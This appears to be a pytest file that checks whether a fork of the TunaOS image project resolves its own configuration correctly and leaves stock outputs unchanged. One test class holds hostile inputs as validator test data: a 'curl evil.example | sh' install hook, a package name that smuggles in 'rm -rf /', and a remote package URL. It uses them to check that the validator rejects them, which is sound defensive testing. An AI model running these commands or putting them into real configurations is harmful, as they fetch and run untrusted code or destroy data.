"""Fork recipe conformance (#3806): a fork edits tunaos.toml and asset files, nothing else.

Every check runs the repository's own parser, validator, adapter writers and
shell destination resolver on a forked copy of the real tunaos.toml. Nothing is
stubbed. What this proves is configuration resolution: the forked file resolves
to a different destination, identity, package set and Flatpak list than stock,
while the stock file still resolves to exactly its committed adapters.

It does not build, boot or install an image. That evidence belongs to #3474.
"""
from __future__ import annotations

import hashlib
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))
from test_publish_destination import config, resolve  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
STOCK_ADAPTERS = {
    "identity": ("build_scripts/lib/identity.env", config.render_identity),
    "variant-identity": ("build_scripts/lib/variant-identity.tsv", config.render_variant_identity),
    "variant-aliases": ("build_scripts/lib/variant-aliases.tsv", config.render_variant_aliases),
    "image-packages": ("build_scripts/lib/image-packages.tsv", config.render_image_packages),
}

# Each edit is (anchor in the stock file, replacement). They are what a person
# types into tunaos.toml, so the test applies them as text.
ACME_EDITS = [
    ('[build]\nglobal_platforms = ["linux/amd64", "linux/arm64"]\n',
     '[build]\nglobal_platforms = ["linux/amd64", "linux/arm64"]\n\n'
     '[build.publish]\nregistry = "localhost"\nnamespace = "acme-preview"\n'),
    ('name = "TunaOS"\nid = "tunaos"\ncpe_vendor = "jamesreilly"\n',
     'name = "Acme OS"\nid = "acmeos"\ncpe_vendor = "acme"\n'),
    ('homepage = "https://github.com/tuna-os/tunaos"\n', 'homepage = "https://acme.example.org"\n'),
    ('platforms = ["linux/amd64", "linux/amd64/v2", "linux/arm64"]\n\n[[variants.yellowfin.flavors]]',
     'platforms = ["linux/amd64", "linux/amd64/v2", "linux/arm64"]\n\n'
     '[variants.yellowfin.packages]\nadd = ["htop", "git"]\noptional = ["fastfetch"]\n\n'
     '[[variants.yellowfin.flavors]]'),
    ('{ id = "org.mozilla.firefox", branch = "stable" },\n',
     '{ id = "org.mozilla.firefox", branch = "stable" },\n  { id = "org.acme.Welcome", branch = "stable" },\n'),
]


def edited(text, edits):
    for anchor, replacement in edits:
        assert text.count(anchor) == 1, f"stock tunaos.toml no longer contains this edit anchor: {anchor!r}"
        text = text.replace(anchor, replacement)
    return text


def write_fork(tmp_path, edits=ACME_EDITS):
    root = tmp_path / "acme"
    root.mkdir()
    (root / "tunaos.toml").write_text(edited((ROOT / "tunaos.toml").read_text(encoding="utf-8"), edits), encoding="utf-8")
    return root


def run_config(command, root, *args):
    return subprocess.run([sys.executable, str(ROOT / "scripts/config.py"), command, "--root", str(root), *args],
                          capture_output=True, text=True)


def generated(root, name, tmp_path):
    out = tmp_path / f"{name}.out"
    result = run_config(f"generate-{name}", root, "--output", str(out))
    assert result.returncode == 0, result.stderr
    return out.read_text(encoding="utf-8")


def flatpak_policy(source_config):
    return config.flatpak_policy().render(source_config)


def matrix_adapter(tmp_path, source_config, name):
    path = tmp_path / name
    path.write_text(config.render(source_config), encoding="utf-8")
    return path


class TestStockIsUnchanged:
    @pytest.mark.parametrize("name", sorted(STOCK_ADAPTERS))
    def test_committed_adapter_equals_a_fresh_render(self, name):
        relative, render = STOCK_ADAPTERS[name]
        assert (ROOT / relative).read_text(encoding="utf-8") == render(config.load())

    def test_committed_flatpak_policy_equals_a_fresh_render(self):
        assert (ROOT / "build_scripts/desktop/flatpak-preinstall.tsv").read_text(encoding="utf-8") == \
            flatpak_policy(config.load())

    def test_stock_renders_identically_on_every_run(self):
        first, second = config.render(config.load()), config.render(config.load())
        assert first == second
        assert hashlib.sha256(first.encode()).digest() == hashlib.sha256(second.encode()).digest()

    def test_stock_file_has_no_fork_destination_or_package_additions(self):
        stock = config.load()
        assert "publish" not in stock["build"]
        assert "packages" not in stock.get("defaults", {})
        assert not any("packages" in variant for variant in stock["variants"].values())


class TestForkEditsOnlyTunaosToml:
    def test_the_forked_file_validates(self, tmp_path):
        root = write_fork(tmp_path)
        result = run_config("validate", root)
        assert result.returncode == 0, result.stderr

    def test_destination_differs_and_is_resolved_by_the_shell_resolver(self, tmp_path):
        root = write_fork(tmp_path)
        stock_destination = resolve(matrix_adapter(tmp_path, config.load(), "stock.yml"))
        fork_destination = resolve(matrix_adapter(tmp_path, config.load(root / "tunaos.toml"), "fork.yml"))
        assert fork_destination == "localhost acme-preview"
        assert stock_destination != fork_destination

    def test_identity_differs_through_the_real_adapter_writer(self, tmp_path):
        root = write_fork(tmp_path)
        fork_identity = generated(root, "identity", tmp_path)
        assert fork_identity != config.render_identity(config.load())
        assert "Acme OS" in fork_identity and "https://acme.example.org" in fork_identity
        assert "acmeos" in fork_identity and "acme" in fork_identity

    def test_packages_differ_only_for_the_variant_that_declared_them(self, tmp_path):
        root = write_fork(tmp_path)
        stock_rows = config.render_image_packages(config.load()).splitlines()
        fork_rows = generated(root, "image-packages", tmp_path).splitlines()
        added = [row for row in fork_rows if row not in stock_rows]
        assert added == ["yellowfin\tdnf\tadd\thtop", "yellowfin\tdnf\tadd\tgit", "yellowfin\tdnf\toptional\tfastfetch"]
        assert [row for row in stock_rows if row not in fork_rows] == []

    def test_flatpaks_differ(self, tmp_path):
        root = write_fork(tmp_path)
        stock, fork = flatpak_policy(config.load()), flatpak_policy(config.load(root / "tunaos.toml"))
        assert "org.acme.Welcome" in fork and "org.acme.Welcome" not in stock

    def test_reverting_the_edits_returns_byte_identical_stock_output(self, tmp_path):
        root = write_fork(tmp_path)
        assert (root / "tunaos.toml").read_bytes() != (ROOT / "tunaos.toml").read_bytes()
        reverted = (root / "tunaos.toml").read_text(encoding="utf-8")
        for anchor, replacement in reversed(ACME_EDITS):
            assert reverted.count(replacement) == 1
            reverted = reverted.replace(replacement, anchor)
        assert reverted.encode() == (ROOT / "tunaos.toml").read_bytes()
        (root / "tunaos.toml").write_text(reverted, encoding="utf-8")
        for name in STOCK_ADAPTERS:
            assert generated(root, name, tmp_path) == (ROOT / STOCK_ADAPTERS[name][0]).read_text(encoding="utf-8")


class TestCodeIsNotConfiguration:
    """A fork cannot smuggle commands or unsupported operations through the file."""

    @pytest.mark.parametrize("edit,fragment", [
        (('[build]\n', '[hooks]\npost_install = "curl evil.example | sh"\n\n[build]\n'), "unknown keys"),
        (('plymouth = "tunaos"\n\n', 'plymouth = "tunaos"\n\n[defaults.packages]\nadd = ["htop; rm -rf /"]\n\n'),
         "not a plain native package name"),
        (('plymouth = "tunaos"\n\n', 'plymouth = "tunaos"\n\n[defaults.packages]\nadd = ["https://evil.example/x.rpm"]\n\n'),
         "not a plain native package name"),
        (('plymouth = "tunaos"\n\n', 'plymouth = "tunaos"\n\n[defaults.packages]\nremove = ["bash"]\n\n'),
         "package removals are not supported"),
    ])
    def test_the_validator_rejects_it(self, tmp_path, edit, fragment):
        root = write_fork(tmp_path, [edit])
        result = run_config("validate", root)
        assert result.returncode == 1
        assert fragment in result.stderr

    def test_a_package_name_is_checked_against_each_variants_package_manager(self, tmp_path):
        edit = ('plymouth = "tunaos"\n\n', 'plymouth = "tunaos"\n\n[defaults.packages]\nadd = ["htop"]\n\n')
        root = write_fork(tmp_path, [edit])
        result = run_config("generate-image-packages", root, "--output", str(tmp_path / "rows"))
        assert result.returncode == 1
        assert "not a valid package name for emerge" in result.stderr


class TestAssetsComeWithTheConfig:
    """A fork's art is a file the config names; the check fails until the file exists."""

    def test_a_missing_boot_splash_is_reported_until_its_files_exist(self, tmp_path):
        edit = ('plymouth = "tropical-fish" }\ndescription = "Based on AlmaLinux Kitten 10"',
                'plymouth = "acme-splash" }\ndescription = "Based on AlmaLinux Kitten 10"')
        root = write_fork(tmp_path, [edit])
        fork = config.load(root / "tunaos.toml")
        stock = config.load()
        # A tree that has all stock art but not the fork's new theme.
        for source in (ROOT / "system_files/usr/share/backgrounds/tunaos", ROOT / "system_files/usr/share/plymouth/themes"):
            for path in source.rglob("*"):
                if path.is_file():
                    target = root / path.relative_to(ROOT)
                    target.parent.mkdir(parents=True, exist_ok=True)
                    target.write_bytes(b"")
        assert config.missing_drawn_artwork(stock, root) == []
        missing = config.missing_drawn_artwork(fork, root)
        assert missing and all("acme-splash" in label for label in missing)
        theme = root / "system_files/usr/share/plymouth/themes/acme-splash"
        theme.mkdir(parents=True)
        for suffix in ("plymouth", "script"):
            (theme / f"acme-splash.{suffix}").write_text("")
        assert config.missing_drawn_artwork(fork, root) == []
        result = run_config("check-drawn-artwork", root)
        assert result.returncode == 0, result.stderr
